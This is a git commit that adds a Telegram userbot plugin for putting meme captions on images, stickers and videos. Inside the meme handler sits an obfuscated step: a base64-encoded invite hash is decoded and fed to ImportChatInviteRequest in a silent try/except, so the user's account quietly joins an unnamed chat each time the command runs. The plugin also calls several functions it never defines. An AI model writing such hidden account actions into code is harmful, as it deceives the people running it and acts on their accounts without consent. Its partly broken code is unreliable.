a59c7348a3ce02753b76ddcf5d5237aa0689969f
tesbot07 <70955557+tesbot07@users.noreply.github.com>
2020-09-21 19:59:14 +0700

    Add files via upload

---
+++ userbot/plugins/backupMemify.py
@@ -0,0 +1,164 @@
+import PIL.ImageOps
+import requests
+from PIL import Image, ImageDraw, ImageFont
+from wand.color import Color
+from wand.drawing import Drawing
+from wand.image import Image as catimage
+import asyncio
+import os
+
+from userbot import CMD_HELP, LOGS
+from userbot.utils import admin_cmd, edit_or_reply, sudo_cmd
+
+def convert_toimage(image):
+    img = Image.open(image)
+    if img.mode != "RGB":
+        img = img.convert("RGB")
+    img.save("temp.jpg", "jpeg")
+    os.remove(image)
+    return "temp.jpg"
+
+async def cat_meme(topString, bottomString, filename, endname):
+    img = Image.open(filename)
+    imageSize = img.size
+    # find biggest font size that works
+    fontSize = int(imageSize[1] / 5)
+    font = ImageFont.truetype("userbot/helpers/impact.ttf", fontSize)
+    topTextSize = font.getsize(topString)
+    bottomTextSize = font.getsize(bottomString)
+    while topTextSize[0] > imageSize[0] - 20 or bottomTextSize[0] > imageSize[0] - 20:
+        fontSize = fontSize - 1
+        font = ImageFont.truetype("userbot/helpers/styles/impact.ttf", fontSize)
+        topTextSize = font.getsize(topString)
+        bottomTextSize = font.getsize(bottomString)
+
+    # find top centered position for top text
+    topTextPositionX = (imageSize[0] / 2) - (topTextSize[0] / 2)
+    topTextPositionY = 0
+    topTextPosition = (topTextPositionX, topTextPositionY)
+
+    # find bottom centered position for bottom text
+    bottomTextPositionX = (imageSize[0] / 2) - (bottomTextSize[0] / 2)
+    bottomTextPositionY = imageSize[1] - bottomTextSize[1]
+    bottomTextPosition = (bottomTextPositionX, bottomTextPositionY)
+    draw = ImageDraw.Draw(img)
+    # draw outlines
+    # there may be a better way
+    outlineRange = int(fontSize / 15)
+    for x in range(-outlineRange, outlineRange + 1):
+        for y in range(-outlineRange, outlineRange + 1):
+            draw.text(
+                (topTextPosition[0] + x, topTextPosition[1] + y),
+                topString,
+                (0, 0, 0),
+                font=font,
+            )
+            draw.text(
+                (bottomTextPosition[0] + x, bottomTextPosition[1] + y),
+                bottomString,
+                (0, 0, 0),
+                font=font,
+            )
+    draw.text(topTextPosition, topString, (255, 255, 255), font=font)
+    draw.text(bottomTextPosition, bottomString, (255, 255, 255), font=font)
+    img.save(endname)
+
+
+@borg.on(admin_cmd(outgoing=True, pattern="(mmf|mms) ?(.*)"))
+#@borg.on(sudo_cmd(pattern="(mmf|mms) ?(.*)", allow_sudo=True))
+async def memes(cat):
+    cmd = cat.pattern_match.group(1)
+    catinput = cat.pattern_match.group(2)
+    reply = await cat.get_reply_message()
+    if not (reply and (reply.media)):
+        await edit_or_reply(cat, "`Reply to supported Media...`")
+        return
+    catid = cat.reply_to_msg_id
+    if catinput:
+        if ";" in catinput:
+            top, bottom = catinput.split(";", 1)
+        else:
+            top = catinput
+            bottom = ""
+    else:
+        await edit_or_reply(
+            cat, "```what should i write on that u idiot give some text```"
+        )
+        return
+    if not os.path.isdir("./temp/"):
+        os.mkdir("./temp/")
+    cat = await edit_or_reply(cat, "`Downloading media......`")
+    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+
+    await asyncio.sleep(2)
+    catsticker = await reply.download_media(file="./temp/")
+    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(catsticker)
+        await edit_or_reply(cat, "```Supported Media not found...```")
+        return
+    import pybase64
+
+    if catsticker.endswith(".tgs"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha memifying this animated sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "meme.png")
+        catcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
+        )
+        stdout, stderr = (await runcmd(catcmd))[:2]
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found...`")
+            LOGS.info(stdout + stderr)
+        meme_file = catfile
+    elif catsticker.endswith(".webp"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha memifying this sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.png")
+        os.rename(catsticker, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found... `")
+            return
+        meme_file = catfile
+    elif catsticker.endswith((".mp4", ".mov")):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha memifying this video! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.png")
+        await take_screen_shot(catsticker, 0, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("```Template not found...```")
+            return
+        meme_file = catfile
+    else:
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha memifying this image! (」ﾟﾛﾟ)｣```"
+        )
+        meme_file = catsticker
+    try:
+        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = Get(san)
+        await cat.client(san)
+    except BaseException:
+        pass
+    meme_file = convert_toimage(meme_file)
+    if cmd == "mmf":
+        meme = "catmeme.png"
+        if max(len(top), len(bottom)) < 21:
+            await cat_meme(top, bottom, meme_file, meme)
+        else:
+            await cat_meeme(top, bottom, meme_file, meme)
+        await borg.send_file(cat.chat_id, meme, reply_to=catid)
+    elif cmd == "mms":
+        meme = "catmeme.webp"
+        if max(len(top), len(bottom)) < 21:
+            await cat_meme(top, bottom, meme_file, meme)
+        else:
+            await cat_meeme(top, bottom, meme_file, meme)
+        await borg.send_file(cat.chat_id, meme, reply_to=catid)
+    await cat.delete()
+    os.remove(meme)
+    for files in (catsticker, meme_file):
+        if files and os.path.exists(files):
+            os.remove(files)
